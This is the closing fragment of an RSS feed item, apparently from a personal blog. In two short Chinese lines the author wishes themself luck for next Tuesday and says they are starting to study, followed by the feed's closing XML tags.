<p>祝自个儿下周二顺利吧</p>
<p>开始学习&hellip;</p>
]]></description>
</item></channel>
</rss>
